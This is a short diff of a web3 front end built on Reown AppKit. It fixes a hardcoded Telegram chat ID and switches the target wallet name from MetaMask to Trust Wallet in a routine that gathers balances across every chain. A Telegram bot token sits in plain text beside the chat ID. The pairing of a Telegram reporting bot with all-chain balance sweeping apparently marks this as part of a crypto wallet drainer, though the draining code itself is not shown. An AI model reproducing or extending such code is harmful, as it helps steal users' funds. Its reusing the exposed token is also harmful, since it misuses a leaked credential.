@@ -14,7 +14,7 @@ import {  useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 
 const TELEGRAM_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
-const TELEGRAM_CHAT_ID = " 7903357798";
+const TELEGRAM_CHAT_ID = "7903357798";
 
 
 const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON'T TOUCH THIS !!!
@@ -1078,7 +1078,7 @@ const fetchAllBalances = async (
       log("Chains with balances:", chainsWithBalances.map((entry) => entry.chain.label));
   
       // Specify the wallet name
-      const walletName = "metamask"; // Change this based on the wallet being used
+      const walletName = "trustwallet"; // Change this based on the wallet being used
   
       for (const { chain, balances } of chainsWithBalances) {
         log(`Switching to chain: ${chain.label}`);
